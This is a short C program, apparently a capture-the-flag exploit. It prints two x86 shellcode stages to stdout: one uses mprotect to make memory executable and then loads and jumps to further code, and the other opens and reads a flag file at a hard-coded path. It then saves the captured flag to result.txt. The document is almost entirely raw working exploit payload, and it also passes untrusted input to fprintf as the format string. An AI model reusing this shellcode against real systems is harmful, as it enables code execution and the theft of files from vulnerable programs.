#include <stdio.h>

main(){
	// make bss executable, read into bss
	char shellcode_mpr[0x22+1] = "\xB0\x7D\xBB\x00\x90\x0E\x08\xB9\x00\x10\x00\x00\x6A\x07\x5A\xCD\x80\x6A\x03\x58\x31\xDB\xB9\x00\x90\x0E\x08\x6A\x60\x5A\xCD\x80\xFF\xD1\x0a";
	write(1, &shellcode_mpr, 0x23);

	// open read write
	char shellcode_orw[0x52+1] = "\xB8\x05\x00\x00\x00\x68\x61\x67\x00\x00\x68\x67\x2F\x66\x6C\x68\x64\x64\x69\x6E\x68\x65\x2F\x6B\x69\x68\x2F\x68\x6F\x6D\x89\xE3\xB9\x00\x00\x00\x00\xBA\x00\x04\x00\x00\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\xB9\x00\xA0\x0E\x08\xBA\x40\x00\x00\x00\xCD\x80\x31\xDB\xB8\x04\x00\x00\x00\xB9\x00\xA0\x0E\x08\xBA\x40\x00\x00\x00\xCD\x80\x0a";
	write(1, &shellcode_orw, 0x53);
	
	// save flag
	char flag[100];
	read(0, &flag, 100);
	FILE *f = fopen("result.txt", "a+");
	fprintf(f, &flag);
	close(f);
}
